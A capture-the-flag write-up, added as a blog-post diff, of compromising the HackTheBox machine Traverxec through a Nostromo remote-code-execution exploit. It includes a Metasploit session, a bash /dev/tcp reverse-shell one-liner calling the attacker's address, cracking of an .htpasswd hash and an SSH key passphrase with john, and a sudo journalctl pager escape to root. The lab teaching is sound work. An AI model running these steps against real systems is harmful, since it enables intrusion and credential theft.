@@ -1,0 +1,369 @@
+---
+layout: htb_box
+title: "HTB: Traverxec"
+code: htb_traverxec
+long_date: "27th December 2019"
+author: rubytox
+---
+
+<p>Hello everyone!</p>
+
+<p>Today, I’m going to make a writeup about Hackthebox machine <a href="https://www.hackthebox.eu/home/machines/profile/217">Traverxec</a>
+    , made by <a href="https://www.hackthebox.eu/home/users/profile/77141">jkr</a>.
+    This box is rated easy by the maker and is kinda easy, I think it’s a good box for a beginner because you can
+    learn a lot of new concepts involving <strong>reading and understanding</strong> documentation: I spent a lot of time quickly
+    overseeing it, and I missed some interesting points because of that.<!--more--></p>
+
+<p>As on every box, I’ll add the box’s IP as <code>traverxec.ctf</code> in <code>/etc/hosts</code>. Now let’s start!</p>
+
+<p>As usual, we start with an nmap scan which gives us the following result:</p>
+
+<pre class="prettyprint nocode">
+$ nmap -sV -sT -sC traverxec.ctf
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2019-11-29 16:11 CET
+Nmap scan report for traverxec.ctf (10.10.10.165)
+Host is up (0.16s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+| ssh-hostkey:
+|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
+|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
+|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (EdDSA)
+80/tcp open  http    nostromo 1.9.6
+|_http-server-header: nostromo 1.9.6
+|_http-title: TRAVERXEC
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.80 seconds
+</pre>
+
+<p>I’m not sure whether there are a lot of exploits over SSH, so I think exploring the port 80 is a better idea.
+    We see that the webserver listening on port 80 is Nostromo, which I didn’t know about.
+    According to Wikipedia<sup><a href="#fn1" id="ref1">1</a></sup>, this web server is run by the daemon <code>httpd</code>.</p>
+
+<p>As we can see with <code>searchsploit</code>, there is basically one existing exploit for Nostromo:</p>
+
+<pre class="prettyprint nocode">
+$ searchsploit nostromo
+--------------------------------------------------------------------------------------------- ----------------------------------
+ Exploit Title                                                                               |  Path
+                                                                                             | (/opt/exploitdb/)
+--------------------------------------------------------------------------------------------- ----------------------------------
+Nostromo - Directory Traversal Remote Command Execution (Metasploit)                         | exploits/multiple/remote/47573.rb
+nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution                         | exploits/linux/remote/35466.sh
+--------------------------------------------------------------------------------------------- ----------------------------------
+Shellcodes: No Result
+</pre>
+
+<p>Let’s check with Metasploit whether this vulnerability can be exploited on our target.</p>
+
+<pre class="prettyprint nocode">
+msf5 > use exploit/multi/http/nostromo_code_exec
+msf5 exploit(multi/http/nostromo_code_exec) > show options
+
+Module options (exploit/multi/http/nostromo_code_exec):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT    80               yes       The target port (TCP)
+   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+   VHOST                     no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (Unix In-Memory)
+
+
+msf5 exploit(multi/http/nostromo_code_exec) > set RHOSTS traverxec.ctf
+RHOSTS => traverxec.ctf
+msf5 exploit(multi/http/nostromo_code_exec) > set LHOST tun0
+LHOST => 10.10.16.46
+msf5 exploit(multi/http/nostromo_code_exec) > check
+[*] 10.10.10.165:80 - The target appears to be vulnerable.
+</pre>
+
+<p>Great! This means that we’re possibly going to get a reverse shell easily.
+    For the exploitation to be easier, we’re going to open a TCP shell once Metasploit has connected.</p>
+
+<p>First we listen on port 1337 with <code>nc -vlp 1337</code>, then we exploit with Metasploit:</p>
+
+<pre class="prettyprint nocode">
+msf5 exploit(multi/http/nostromo_code_exec) > exploit
+
+[*] Started reverse TCP handler on 10.10.16.46:4444
+[*] Configuring Automatic (Unix In-Memory) target
+[*] Sending cmd/unix/reverse_perl command payload
+[*] Command shell session 1 opened (10.10.16.46:4444 -> 10.10.10.165:41902) at 2019-12-27 18:56:34 +0100
+
+bash -c "exec bash -i >& /dev/tcp/10.10.16.46/1337 0>&1"
+</pre>
+
+<p>The last line is the command we use to spawn a TCP connection to our machine,
+    which is listening on port 1337, now we have a friendly reverse shell:</p>
+
+<pre class="prettyprint nocode">
+www-data@traverxec:/usr/bin$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre>
+
+<p>However this shell is low privilege, we need to explore a little bit in order to get user and root flags.
+    Looking into the <code>/home</code> directory, we find a user named <code>david</code>:</p>
+
+<pre class="prettyprint nocode">
+www-data@traverxec:/home$ ls -la
+drwx--x--x  7 david david 4096 Dec 27 12:57 david
+</pre>
+
+<p>Fun thing, David’s home directory can be accessed, but not read nor modified.
+    As we don’t really know what we’re looking for at the moment, I’ll get back to this directory a bit later.
+    When dealing with a web server, we can usually find the files it uses in <code>/var</code>.
+    Here, we find our interesting files in <code>/var/nostromo</code>:</p>
+
+<pre class="prettyprint nocode">
+www-data@traverxec:/var/nostromo$ ls -la
+drwxr-xr-x  2 root     daemon 4096 Oct 27 16:12 conf
+drwxr-xr-x  6 root     daemon 4096 Oct 25 17:11 htdocs
+drwxr-xr-x  2 root     daemon 4096 Oct 25 14:43 icons
+drwxr-xr-x  2 www-data daemon 4096 Dec 27 13:00 logs
+</pre>
+
+<p>Here, the interesting directory is <code>conf</code>: <code>htdocs</code> basically contains the different files and medias used by
+    the website which aren’t really interesting, and the other directories don’t contain anything exploitable.
+    So let’s go to the <code>conf</code> directory which would contain Nostromo configuration.</p>
+
+<pre class="prettyprint nocode">
+www-data@traverxec:/var/nostromo/conf$ ls -la
+-rw-r--r-- 1 root bin      41 Oct 25 15:20 .htpasswd
+-rw-r--r-- 1 root bin    2928 Oct 25 14:26 mimes
+-rw-r--r-- 1 root bin     498 Oct 25 15:20 nhttpd.conf
+</pre>
+
+<p>We first notice that there’s a <code>.htpasswd</code> file there, which contains the hashed password for user <code>david</code>:</p>
+
+<pre class="prettyprint nocode">
+david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
+</pre>
+
+<p>We’re going to crack this hash using <code>john</code> and the wordlist rockyou, which gives us:</p>
+
+<pre class="prettyprint nocode">
+david:Nowonly4me
+</pre>
+
+<p>Now, we just need to find where do we use those credentials: the initial website doesn’t ask for authentication.
+    Let’s look at the configuration file we find in the directory as well.</p>
+
+<p>We remember from the Wikipedia article that <code>nhttpd</code> is the name of Nostromo web server daemon,
+    so the file <code>nhttpd.conf</code> will contain the configuration elements, which are:</p>
+
+<pre class="prettyprint nocode">
+www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
+# MAIN [MANDATORY]
+
+servername              traverxec.htb
+serverlisten            *
+serveradmin             david@traverxec.htb
+serverroot              /var/nostromo
+servermimes             conf/mimes
+docroot                 /var/nostromo/htdocs
+docindex                index.html
+
+# LOGS [OPTIONAL]
+
+logpid                  logs/nhttpd.pid
+
+# SETUID [RECOMMENDED]
+
+user                    www-data
+
+# BASIC AUTHENTICATION [OPTIONAL]
+
+htaccess                .htaccess
+htpasswd                /var/nostromo/conf/.htpasswd
+
+# ALIASES [OPTIONAL]
+
+/icons                  /var/nostromo/icons
+
+# HOMEDIRS [OPTIONAL]
+
+<span class="highlighted">homedirs                /home</span>
+<span class="highlighted">homedirs_public         public_www</span>
+</pre>
+
+<p>Let’s explain why I highlighted the two last lines of the file. The documentation of Nostromo<sup><a href="#fn2" id="ref2">2</a></sup> tells us that
+    it is possible for any user to host their personal files: the <code>homedirs</code> entry specifies the directories containing
+    the home directories of the users willing to host pages. Here, we see that any user located in <code>/home</code> can host pages:
+    in particular, David is be able to. We learn that we can access a user’s hosted pages by accessing the URL
+    <code>http://traverxec.ctf/~user/</code>. We’re going to try with David:</p>
+
+<img src="/img/{{ page.code }}/traverxec1.png" alt="David's home page" style="max-width: 1000px; max-height: 1000px; width: auto; height: auto" />
+
+<p>At this point I was a bit stuck because it seemed to be a completely static website.
+    The error I made was that I thought the page which was displayed in the screenshot was at the root of David’s
+    home directory; however, I tried to access common paths such as <code>.ssh</code>, or the <code>user.txt</code> file which should contain
+    the flag, which led to a 404 error code. This actually meant that I was in the wrong directory.</p>
+
+<p>I read the documentation again and came upon a line I didn’t notice before:</p>
+
+<pre class="prettyprint nocode">
+You can restrict the access within the home directories to a single sub directory by defining it via the homedirs_public option.
+</pre>
+
+<p>This is why I highlighted the last line of the configuration file: the entry <code>homedirs_public</code> contains the
+    name of the directory in which each user’s hosted files will remain. As David’s home directory is accessible,
+    we can try to find his <code>public_www</code> directory:</p>
+
+<pre class="prettyprint nocode">
+www-data@traverxec:/home/david/public_www$ ls -la
+-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html
+drwxr-xr-x 2 david david 4096 Dec 27 13:22 protected-file-area
+</pre>
+
+<p>We then go into the <code>protected-file-area</code> directory:</p>
+
+<pre class="prettyprint nocode">
+www-data@traverxec:/home/david/public_www/protected-file-area$ ls -la
+-rw-r--r-- 1 david david    45 Oct 25 15:46 .htaccess
+-rw-r--r-- 1 david david 10240 Oct 25 17:02 backup-ssh-identity-files.tar
+</pre>
+
+<p>We see an interesting tar archive, which is likely to contain David’s SSH keys. Here, there is several ways to
+    get the file: we can go to the <code>protected-file-area</code> directory with our web browser and download the file;
+    however we can see a <code>.htaccess</code> file, which restricts the access to the page. This is where the <code>.htpasswd</code>
+    credentials will be useful!</p>
+
+<p>There is another way which works for small files that I learned about recently:
+    we get the base 64 encoded version of the file, copy it on our computer, and then decode it with <code>base64 -d</code>.</p>
+
+<p>Either way, we now have a tar archive. <strong>Security note:</strong> before extracting a tar archive,
+    we should always check its content! We can use the <code>-t</code> option of tar in order to see the contents and test files:</p>
+
+<pre class="prettyprint nocode">
+$ tar -tvf tarfile
+drwx------ david/david       0 2019-10-25 23:02 home/david/.ssh/
+-rw-r--r-- david/david     397 2019-10-25 23:02 home/david/.ssh/authorized_keys
+-rw------- david/david    1766 2019-10-25 23:02 home/david/.ssh/id_rsa
+-rw-r--r-- david/david     397 2019-10-25 23:02 home/david/.ssh/id_rsa.pub
+</pre>
+
+<p>This is useful to detect a tarbomb<sup><a href="#fn3" id="ref3">3</a></sup> for instance.</p>
+
+<p>Now, we can extract the archive and we get to the <code>.ssh</code> directory. We come accross <code>id_rsa</code> and <code>id_rsa.pub</code>
+    RSA identity files, which we’re going to use to connect to the machine via SSH:</p>
+
+<pre class="prettyprint nocode">
+$ ssh -i id_rsa david@traverxec.ctf
+Enter passphrase for key 'id_rsa':
+</pre>
+
+<p>We have to crack the key, <code>id_rsa</code> is a protected private key. We use the software <code>ssh2john</code> in order
+    to get the hash for the passphrase, then we use john and rockyou wordlist to crack it:</p>
+
+<pre class="prettyprint nocode">
+$ ssh2john id_rsa > hash
+$ john --wordlist=rockyou.txt hash
+id_rsa:hunter
+</pre>
+
+<p>Then, we can connect using SSH:</p>
+
+<pre class="prettyprint nocode">
+$ ssh -i id_rsa david@traverxec.ctf
+Enter passphrase for key 'id_rsa': [hunter]
+david@traverxec:~$ id
+uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+david@traverxec:~$ cat user.txt
+7db0b[-- REDACTED --]82f3d
+</pre>
+
+<p>We owned user!</p>
+
+<p>Let’s own root now. In David’s home directory, we see a <code>bin</code> directory containing two files :
+    <code>server-stats.head</code> and <code>server-stats.sh</code>. The former is just a piece of ASCII art, the latter a
+    script which show some information about the <code>nhttpd</code> service:</p>
+
+<pre class="prettyprint">
+#!/bin/bash
+
+cat /home/david/bin/server-stats.head
+echo "Load: `/usr/bin/uptime`"
+echo " "
+echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
+echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
+echo " "
+echo "Last 5 journal log lines:"
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
+</pre>
+
+<p>The most interesting line is the last one: it calls the <code>journalctl</code> utility using <code>sudo</code>;
+    we might be able to execute something else.</p>
+
+<p>First thing, we can try to change the executable being called after <code>sudo</code>, but it doesn’t work.
+    It’s likely that <code>journalctl</code> is the only program allowed to be called using sudo without being asked
+    for a password. This kind of behaviour can be achieved by editing <code>/etc/sudoers</code>. So, we need to get
+    root with using <code>journalctl</code>. We can check if there exists any known way to do so with <a href="https://gtfobins.github.io/">GTFOBins</a>.</p>
+
+<p>We learn<sup><a href="#fn4" id="ref4">4</a></sup> that when the text displayed by <code>journalctl</code> is too
+    long, it will spawn the default pager, which is usually <code>less</code>. If we are able to spawn <code>less</code>,
+    then we can get a shell by typing <code>! bash</code>. However, <code>journalctl</code> is asked to print only five
+    lines, and we can’t change that: <code>sudo</code> doesn’t work if we do.</p>
+
+<p>So, how is it possible to make <code>journalctl</code> think it has too much text to print for the actual screen
+    resolution without altering the quantity of text it has to print? Change the screen size! We resize our terminal to the following:</p>
+
+<img src="/img/{{ page.code }}/traverxec2.png" alt="Low resolution" style="max-width: 1000px; max-height: 1000px; width: auto; height: auto"/>
+
+<p>This is enough to be able to spawn <code>less</code>:</p>
+
+<img src="/img/{{ page.code }}/traverxec3.png" alt="Low resolution" style="max-width: 1000px; max-height: 1000px; width: auto; height: auto"/>
+
+<p>We just have to type <code>! /bin/bash</code>:</p>
+
+<img src="/img/{{ page.code }}/traverxec4.png" alt="Low resolution" style="max-width: 1000px; max-height: 1000px; width: auto; height: auto"/>
+
+<p>We owned root!</p>
+
+<p><strong>Conclusion:</strong> I thought this box was pretty fun; it allowed me to learn a lot especially about enumeration,
+    it took a very long time for me to find the use of the <code>homedirs_public</code> entry.
+    To me the user part was the hardest, root was straightforward.</p>
+
+<p>I hope you liked my writeup and that it could have been useful to you!</p>
+
+<p>So this is over for this box! If you have any comments or suggestions, feel free to open an issue on <a href="https://github.com/Rubytox/Rubytox.github.io">this website's GitHub page</a>.</p>
+
+<!-- Footnotes -->
+
+<hr />
+
+<sup id="fn1">1. <a href="https://en.wikipedia.org/wiki/Nhttpd">https://en.wikipedia.org/wiki/Nhttpd</a><a href="#ref1" title="Jump back to footnote 1 in the text.">↩</a></sup>
+<br>
+
+<sup id="fn2">2. <a href="https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd">https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd</a><a href="#ref2" title="Jump back to footnote 2 in the text.">↩</a></sup>
+<br>
+
+<sup id="fn3">3. <a href="http://www.linfo.org/tarbomb.html">http://www.linfo.org/tarbomb.html</a><a href="#ref3" title="Jump back to footnote 3 in the text.">↩</a></sup>
+<br>
+
+<sup id="fn4">3. <a href="https://gtfobins.github.io/gtfobins/journalctl/">https://gtfobins.github.io/gtfobins/journalctl/</a><a href="#ref4" title="Jump back to footnote 4 in the text.">↩</a></sup>
